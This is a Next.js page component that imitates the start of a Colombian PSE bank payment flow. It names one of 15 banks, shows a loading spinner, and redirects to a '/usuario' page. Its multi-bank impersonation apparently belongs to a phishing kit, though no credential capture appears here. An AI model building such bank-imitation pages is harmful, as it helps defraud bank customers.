"use client";

import { useEffect } from 'react';
import { useRouter, useParams } from 'next/navigation';

export default function BankIndexPage() {
    const router = useRouter();
    const params = useParams();
    const bankId = params.bankId as string;

    useEffect(() => {
        // Redirect to usuario page after 3 seconds
        const timer = setTimeout(() => {
            router.push(`/pse/${bankId}/usuario`);
        }, 3000);

        return () => clearTimeout(timer);
    }, [router, bankId]);

    const bankNames: Record<string, string> = {
        bancolombia: 'Bancolombia',
        davivienda: 'Davivienda',
        bogota: 'Banco de Bogotá',
        nequi: 'Nequi',
        avvillas: 'AV Villas',
        colpatria: 'Colpatria',
        popular: 'Popular',
        cajasocial: 'Caja Social',
        citibank: 'Citibank',
        falabella: 'Falabella',
        finandina: 'Finandina',
        itau: 'Itaú',
        occidente: 'Occidente',
        serfinanza: 'Serfinanza',
        tuya: 'Tuya'
    };

    return (
        <div className="min-h-screen bg-white flex flex-col">
            {/* Header */}
            <header className="border-b border-gray-200 p-4 flex justify-between items-center">
                <div className="text-xl font-bold text-gray-800">
                    {bankNames[bankId] || 'Banco'}
                </div>
                <button className="text-blue-600 hover:text-blue-800 flex items-center gap-2">
                    Salir
                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 8l4 4m0 0l-4 4m4-4H3" />
                    </svg>
                </button>
            </header>

            {/* Loading Animation */}
            <main className="flex-1 flex flex-col items-center justify-center">
                <div className="flex flex-col items-center gap-6">
                    <div className="relative">
                        <div className="w-16 h-16 border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin"></div>
                    </div>
                    <div className="text-center">
                        <div className="text-xl font-semibold text-gray-800">Iniciando</div>
                        <div className="text-xl font-semibold text-gray-800">Transacción...</div>
                    </div>
                </div>
            </main>

            {/* Footer */}
            <div className="h-2 bg-gradient-to-r from-yellow-400 via-red-500 to-blue-600"></div>
        </div>
    );
}
